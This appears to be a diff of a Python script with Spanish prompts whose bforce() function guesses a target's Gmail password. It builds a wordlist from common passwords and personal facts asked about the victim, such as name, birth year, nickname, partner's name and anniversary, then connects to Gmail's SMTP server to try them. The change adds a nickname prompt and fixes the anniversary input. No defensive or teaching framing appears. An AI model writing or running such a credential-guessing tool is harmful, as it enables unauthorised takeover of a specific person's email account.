@@ -70,7 +70,7 @@ def filefactory(msg, content):
 
 
 def bforce():
-	data = ["123456","12345678","qwerty", "Password", "password", "123456789", "hello", "hola"]
+	data = ["123456","12345678","qwerty", "password", "123456789", "hola"]
 	subprocess.call(["cmd.exe","/c","cls"])
 	print("este algoritmo solo funciona con correos de gmail.")
 	email = str(raw_input("introduce el corre electronico de el objetivo: "))
@@ -78,13 +78,15 @@ def bforce():
 	data.append(name)
 	year = str(raw_input("introduce el año de nacimeinto de {}: ".format(name)))
 	data.append(year)
+	nickname = str(raw_input("cual es el apodo de {}? ".format(name)))
+	data.append(nickname)
 	cpl = str(raw_input("{} tiene pareja? Y/N: ".format(name)))
 	if cpl == "y" or cpl == "Y":
 		data.append("iloveyou")
 		data.append("teamo")
 		couple = str(raw_input("como se llama la pareja de {}?: ".format(name)))
 		data.append(couple)
-		anniversary = str(raw_input)
+		anniversary = str(raw_input("cuando es el aniversario de {} y {}? ".format(couple, name)))
 		data.append(anniversary)
 	server = smtplib.SMTP('smtp.gmail.com:587')
 	server.starttls()
